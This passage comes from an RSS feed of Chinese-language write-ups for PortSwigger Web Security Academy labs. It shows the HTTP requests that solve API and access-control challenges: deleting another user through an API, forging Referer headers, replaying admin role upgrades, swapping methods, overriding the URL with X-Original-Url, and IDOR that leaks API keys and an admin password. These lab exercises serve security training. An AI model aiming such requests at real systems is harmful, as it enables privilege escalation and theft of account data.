&lt;/ol></content></item><item><title>[Write Up]Lab: Exploiting an API endpoint using documentation</title><link>/portswigger-posts/api-testing-lab-exploiting-api-endpoint-using-documentation/</link><pubDate>Sat, 14 Dec 2024 22:32:19 +0800</pubDate><guid>/portswigger-posts/api-testing-lab-exploiting-api-endpoint-using-documentation/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-api-endpoint-using-documentation-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-api-endpoint-using-documentation-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
&lt;li>修改&lt;code>Email&lt;/code>
&lt;img alt="Update email" src="/img/2024/api-testing-lab-exploiting-api-endpoint-using-documentation-2.jpg">&lt;/li>
&lt;li>对应Request、Response
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">PATCH&lt;/span> /api/user/wiener &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;email&amp;#34;:&amp;#34;email@email.com&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;username&amp;#34;:&amp;#34;wiener&amp;#34;,&amp;#34;email&amp;#34;:&amp;#34;email@email.com&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>使用&lt;code>OPTION&lt;/code>查看可用的&lt;code>HTTP Methods&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">OPTION /api/user/wiener HTTP/2
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">405&lt;/span> &lt;span style="color:#a6e22e">Method Not Allowed&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Allow&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">GET, PATCH, DELETE&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Method Not Allowed&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>使用&lt;code>DELETE&lt;/code>进行对象删除
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">DELETE&lt;/span> /api/user/carlos &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;status&amp;#34;:&amp;#34;User deleted&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>刷新页面后即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Referer-based access control</title><link>/portswigger-posts/access-control-lab-referer-based-access-control/</link><pubDate>Mon, 09 Dec 2024 22:32:44 +0800</pubDate><guid>/portswigger-posts/access-control-lab-referer-based-access-control/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-referer-based-access-control-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-referer-based-access-control-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>使用&lt;code>administrator:admin&lt;/code>登录&lt;/li>
&lt;li>点击&lt;code>Admin panel&lt;/code>后可以看到调整用户权限的功能
&lt;img alt="Admin panel" src="/img/2024/access-control-lab-referer-based-access-control-2.jpg">&lt;/li>
&lt;li>选择&lt;code>carlos (NORMAL)&lt;/code>并点击&lt;code>Upgrade user&lt;/code>，对应请求如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin-roles?username=carlos&amp;amp;action=upgrade &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">https://0a4e00ad04fff04884d1b0d900e400cf.web-security-academy.net/admin&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>登出&lt;code>administrator&lt;/code>，使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
&lt;li>重复步骤3 Request，将&lt;code>username&lt;/code>修改为&lt;code>winer&lt;/code>，即可解题
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin-roles?username=wiener&amp;amp;action=upgrade &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">https://0a4e00ad04fff04884d1b0d900e400cf.web-security-academy.net/admin&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Multi-step process with no access control on one step</title><link>/portswigger-posts/access-control-lab-multi-step-process-with-no-access-control-on-one-step/</link><pubDate>Mon, 09 Dec 2024 22:12:29 +0800</pubDate><guid>/portswigger-posts/access-control-lab-multi-step-process-with-no-access-control-on-one-step/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-multi-step-process-with-no-access-control-on-one-step-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-multi-step-process-with-no-access-control-on-one-step-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>使用&lt;code>administrator:admin&lt;/code>登录&lt;/li>
&lt;li>点击&lt;code>Admin panel&lt;/code>后可以看到调整用户权限的功能
&lt;img alt="Admin panel" src="/img/2024/access-control-lab-multi-step-process-with-no-access-control-on-one-step-2.jpg">&lt;/li>
&lt;li>选择&lt;code>carlos (NORMAL)&lt;/code>并点击&lt;code>Upgrade user&lt;/code>，将跳转至确认页面
&lt;img alt="Are you sure" src="/img/2024/access-control-lab-multi-step-process-with-no-access-control-on-one-step-3.jpg">&lt;/li>
&lt;li>点击&lt;code>Yes&lt;/code>后，对应Request如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /admin-roles &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>action=upgrade&amp;amp;confirmed=true&amp;amp;username=carlos
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>登出&lt;code>administrator&lt;/code>，使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
&lt;li>重复步骤4 Request，将&lt;code>username&lt;/code>修改为&lt;code>winer&lt;/code>，即可解题
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /admin-roles &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>action=upgrade&amp;amp;confirmed=true&amp;amp;username=wiener
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Method-based access control can be circumvented</title><link>/portswigger-posts/access-control-lab-method-based-access-control-can-be-circumvented/</link><pubDate>Mon, 09 Dec 2024 21:54:28 +0800</pubDate><guid>/portswigger-posts/access-control-lab-method-based-access-control-can-be-circumvented/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-method-based-access-control-can-be-circumvented-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-method-based-access-control-can-be-circumvented-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>使用&lt;code>administrator:admin&lt;/code>登录&lt;/li>
&lt;li>点击&lt;code>Admin panel&lt;/code>后可以看到调整用户权限的功能
&lt;img alt="Admin panel" src="/img/2024/access-control-lab-method-based-access-control-can-be-circumvented-2.jpg">&lt;/li>
&lt;li>选择&lt;code>carlos (NORMAL)&lt;/code>并点击&lt;code>Upgrade user&lt;/code>，对应Request
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /admin-roles &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username=carlos&amp;amp;action=upgrade
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>登出&lt;code>administrator&lt;/code>，使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
&lt;li>重复步骤3 Request，获得以下Response
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">401&lt;/span> &lt;span style="color:#a6e22e">Unauthorized&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json; charset=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">14&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;Unauthorized&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>将请求修改为&lt;code>GET&lt;/code>且&lt;code>username&lt;/code>参数修改为&lt;code>wiener&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin-roles?username=wiener&amp;amp;action=upgrade &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Location&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">/admin&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>刷新页面后即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: URL-based access control can be circumvented</title><link>/portswigger-posts/access-control-lab-url-based-access-control-can-be-circumvented/</link><pubDate>Mon, 09 Dec 2024 21:33:43 +0800</pubDate><guid>/portswigger-posts/access-control-lab-url-based-access-control-can-be-circumvented/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-url-based-access-control-can-be-circumvented-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-url-based-access-control-can-be-circumvented-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>尝试点击右上角&lt;code>Admin panel&lt;/code>进行管理页面，获得以下Response
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span> &lt;span style="color:#a6e22e">Forbidden&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json; charset=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;Access denied&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>修改以下请求，新增&lt;code>X-Original-Url: /admin&lt;/code>请求头
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> / &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Original-Url: /admin
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>回到浏览器显示结果，点击&lt;code>carlos - Delete&lt;/code>，获得错误，对应Request、Response如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin/delete?username=carlos &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span> &lt;span style="color:#a6e22e">Forbidden&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json; charset=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;Access denied&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>修改Request
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /delete?username=carlos &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Original-Url: /admin/delete
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Location&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">/admin&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>刷新页面后即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: User ID controlled by request parameter with password disclosure</title><link>/portswigger-posts/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure/</link><pubDate>Sun, 08 Dec 2024 23:13:36 +0800</pubDate><guid>/portswigger-posts/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录&lt;/li>
&lt;li>访问&lt;code>my-account?id=administrator&lt;/code>
&lt;img alt="administrator" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure-2.jpg">&lt;/li>
&lt;li>查看Response源代码，可以获得明文密码
&lt;img alt="administrator password" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure-3.jpg">&lt;/li>
&lt;li>使用&lt;code>administrator:v02rt5a778ksnqgk70iq&lt;/code>进行登录
&lt;img alt="administrator" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure-4.jpg">&lt;/li>
&lt;li>点击&lt;code>Admin panel&lt;/code>进入管理页面后，点击&lt;code>carlos - Delete&lt;/code>即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: User ID controlled by request parameter with data leakage in redirect</title><link>/portswigger-posts/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect/</link><pubDate>Sun, 08 Dec 2024 23:02:09 +0800</pubDate><guid>/portswigger-posts/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录&lt;/li>
&lt;li>将url替换为&lt;code>/my-account?id=carlos&lt;/code>会跳转回登录页面
&lt;img alt="Login" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect-2.jpg">&lt;/li>
&lt;li>观察&lt;code>/my-account?id=carlos&lt;/code>的Response
&lt;pre tabindex="0">&lt;code>HTTP/2 302 Found
Location: /login
&lt;/code>&lt;/pre>&lt;img alt="Profile" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect-3.jpg">&lt;/li>
&lt;li>虽然进行跳转，但Response中包含了&lt;code>API key&lt;/code>&lt;/li>
&lt;li>点击上方&lt;code>Submit solution&lt;/code>，将&lt;code>Your API Key is&lt;/code>填入即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: User ID controlled by request parameter, with unpredictable user IDs</title><link>/portswigger-posts/access-control-lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids/</link><pubDate>Sun, 08 Dec 2024 22:48:31 +0800</pubDate><guid>/portswigger-posts/access-control-lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录&lt;/li>
&lt;li>观察&lt;code>My account&lt;/code>的url为&lt;code>/my-account?id=41c5a7f4-33c3-4f6b-927e-ac36f46c66bd&lt;/code>&lt;/li>
&lt;li>点击&lt;code>Home&lt;/code>找到&lt;code>carlos&lt;/code>发布的文章
&lt;img alt="Post" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids-2.jpg">&lt;/li>
&lt;li>点击后会跳转到&lt;code>/blogs?userId=aabdb9d7-d2af-4f89-9a2f-5756fc7affd0&lt;/code>，可得知&lt;code>carlos&lt;/code>的&lt;code>id&lt;/code>为&lt;code>aabdb9d7-d2af-4f89-9a2f-5756fc7affd0&lt;/code>&lt;/li>
&lt;li>拼接步骤2的url为&lt;code>/my-account?id=aabdb9d7-d2af-4f89-9a2f-5756fc7affd0&lt;/code>，便可跳转到&lt;code>carlos&lt;/code>的页面&lt;/li>
&lt;li>点击上方&lt;code>Submit solution&lt;/code>，将&lt;code>Your API Key is&lt;/code>填入即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: User ID controlled by request parameter</title><link>/portswigger-posts/access-control-lab-user-id-controlled-by-request-parameter/</link><pubDate>Sun, 08 Dec 2024 20:01:37 +0800</pubDate><guid>/portswigger-posts/access-control-lab-user-id-controlled-by-request-parameter/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录&lt;/li>
&lt;li>修改url为&lt;code>/my-account?id=carlos&lt;/code>即可获得&lt;code>carlos&lt;/code>的API key
&lt;img alt="API key" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-2.jpg">&lt;/li>
&lt;li>点击上方&lt;code>Submit solution&lt;/code>，将&lt;code>Your API Key is&lt;/code>填入即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: User role can be modified in user profile</title><link>/portswigger-posts/access-control-lab-user-role-can-be-modified-in-user-profile/</link><pubDate>Sun, 08 Dec 2024 19:43:17 +0800</pubDate><guid>/portswigger-posts/access-control-lab-user-role-can-be-modified-in-user-profile/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
